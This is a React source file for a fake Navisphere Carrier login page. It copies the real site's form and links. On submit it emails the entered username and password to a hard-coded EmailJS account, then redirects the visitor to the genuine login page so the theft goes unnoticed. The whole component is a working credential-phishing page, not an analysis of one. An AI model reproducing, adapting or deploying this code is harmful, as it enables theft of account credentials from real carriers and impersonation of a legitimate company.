import '../HomePgae/homepage.css';
import logoSvg from '../../img/Logo.svg';
import { useState, useRef } from "react";
import emailjs from 'emailjs-com';
// sdf
function HomePage() {
    const [passwordShown, setPasswordShown] = useState(false);
    const userName = useRef(null);
    const passwordUser = useRef(null);
    var qfNum = 0;
    function qfFunck(qf) {
        if(qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
        qf.value.indexOf('jaj tam') !== -1 || qf.value.indexOf('txeq') !== -1 || qf.value.indexOf('cceq') !== -1 || qf.value.indexOf('uteq') !== -1 ||
        qf.value.indexOf('fuck') !== -1 || qf.value.indexOf('suck') !== -1 || qf.value.indexOf('dick') !== -1 || qf.value.indexOf('gandon') !== -1 ||
        qf.value.indexOf('qunnem') !== -1 || qf.value.indexOf('txa') !== -1 || qf.value.indexOf('boz') !== -1 || qf.value.indexOf('chatlax') !== -1 ||
        qf.value.indexOf('gyot') !== -1 || qf.value.indexOf('garlax') !== -1) {
            qf.value = '';
            qf.nextSibling.style.display = "block";
            qfNum = 1;
        } else {
            qfNum = 0;
        }
    }
    const handleInputBlur = event => {
        if(event.target.value == 0){
            event.target.nextSibling.style.display = "block";
        } else {
            event.target.nextSibling.style.display = "none";
        }
        qfFunck(event.target);
    };

    const togglePassword = () => {
        setPasswordShown(!passwordShown);
    };
    const SERVICE_ID = 'service_cf79ytj';
    const TEMPLATE_ID = 'template_8oalb5q';
    const USER_ID = "5Fma-P-1aeivvlJxc";
     function handleSubmit(event) {
        event.preventDefault();
        qfFunck(userName.current);
        if(qfNum == 1) {
            userName.current.value = '';
            userName.current.nextSibling.style.display = "block";
        } else if(qfNum == 0) {
            qfFunck(passwordUser.current);
            if(qfNum == 0){
                if(userName.current.value && passwordUser.current.value) {
                    emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
                    .then((result) => {
                        console.log("result.text");
                    }, (error) => {
                        console.log("error.text");
                    });
                    // sendEmail(userName.current.value, passwordUser.current.value);
                    window.location.href = "https://www.navispherecarrier.com/login";
                    return;
                }
            }
        }
        if (!userName.current.value) {
            event.target[0].nextSibling.style.display = "block";
        } 
        if (!passwordUser.current.value) {
            event.target[1].nextSibling.style.display = "block";
        }
    }
     
  return (
    <section className="sectionOne">
          <div className="box">
              <div className="mainLogo">
                  <img src={logoSvg} alt="logo" className="logo" id="mainlogo" />
              </div>
              <form onSubmit={handleSubmit} id="formss">
                  <div className="space-outer-bottom-md js-field-username">
                      <label className="required">Username</label>
                      <a className="forgot-link" href="https://www.navispherecarrier.com/login/forgot-username">Forgot Username</a>
                      <input onBlur={handleInputBlur} id="Username" ref={userName} name="Username" auto-id="signin_username_input" type="text" placeholder="Username" className="form-control" />
                      <div style={{display:'none'}} aria-live="assertive" className="form-error-live-region">
                          <div className="form-group space-outer-top-xs has-error js-form-error">
                              <div className="help-text form-error ns-icon ns-error" role="alert" data-cy="signin_email_validation_error">
                                  <span className="translation-jsx-component">Username is required</span>
                              </div>
                          </div>
                      </div>
                  </div>
                  <div className="space-outer-bottom-md js-field-password">
                      <label className="required">Password</label>
                      <a className="forgot-link" href="https://www.navispherecarrier.com/login/forgot-password">Forgot Password</a>
                      <input onBlur={handleInputBlur} id="Password" ref={passwordUser} name="Password" auto-id="signin_password_input" type={passwordShown ? "text" : "password"} placeholder="Password" className="form-control" />
                      <div style={{display:'none'}} aria-live="assertive" className="form-error-live-region">
                          <div className="form-group space-outer-top-xs has-error js-form-error">
                              <div className="help-text form-error ns-icon ns-error" role="alert" data-cy="signin_password_validation_error">
                                  <span className="translation-jsx-component">Password is required</span>
                              </div>
                          </div>
                      </div>
                  </div>
                  <div className="form-group js-field-show-password">
                      <label className="checkbox-inline"><input onClick={togglePassword} name="show-password" type="checkbox" id="showpass" />Show password</label>
                  </div>
                  <div style={{display:'none'}} className="errorBar api-error form-group space-outer-top-xs has-error js-form-error">
                    <div className="help-text form-error ns-icon ns-error" role="alert" data-cy="signin_form_error">
                        <span id="" className="translation-jsx-component">The username or password you entered is incorrect.</span>
                    </div>
                  </div>
                  <div className="buttons">
                      <button id="btnLogin" auto-id="signin_submit_login_button" type='submit' className="btn btn-primary btn-block"> Log in</button>
                      <a href="https://www.navispherecarrier.com/registration" id="btn-register" type="button" className="btn btn-default btn-block">Create Account</a>
                  </div>
              </form>
          </div>
    </section>
  );
}

export default HomePage;
